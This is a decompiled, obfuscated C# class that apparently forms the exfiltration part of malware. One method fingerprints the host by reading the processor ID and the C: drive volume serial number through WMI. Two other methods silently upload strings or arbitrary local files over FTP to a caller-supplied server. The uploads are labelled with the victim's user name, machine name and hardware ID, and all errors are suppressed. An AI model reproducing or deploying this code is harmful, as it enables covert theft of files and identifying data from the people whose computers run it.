using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace YzTymtbtgFABHvJvj;

internal sealed class tbTGHSHczYFiA
{
	public static string eRjoPReHvhw()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = "C";
			ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? "" : text;
		}
	}

	public static void vGjAakkFFwJRwEa(string LHeYDBKMNNLvU = "URL", string mGPZKyLHDbL = "USERNAME", string TdFnQkmqRaXN = "ACCESO", string rPozKBBIEwelYFZS = "")
	{
		try
		{
			string text = eRjoPReHvhw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(LHeYDBKMNNLvU + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(mGPZKyLHDbL, TdFnQkmqRaXN);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(rPozKBBIEwelYFZS);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void notwODHLHfYFV(string ZRmkcRfEUAgr = "URL", string bWVLedviutX = "USERNAME", string eudqONHzIALg = "ACCESO", string RoNloiydpYsIBW = "")
	{
		try
		{
			string text = eRjoPReHvhw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ZRmkcRfEUAgr + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + "_" + Path.GetFileName(RoNloiydpYsIBW));
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(bWVLedviutX, eudqONHzIALg);
			byte[] array = File.ReadAllBytes(RoNloiydpYsIBW);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}
}
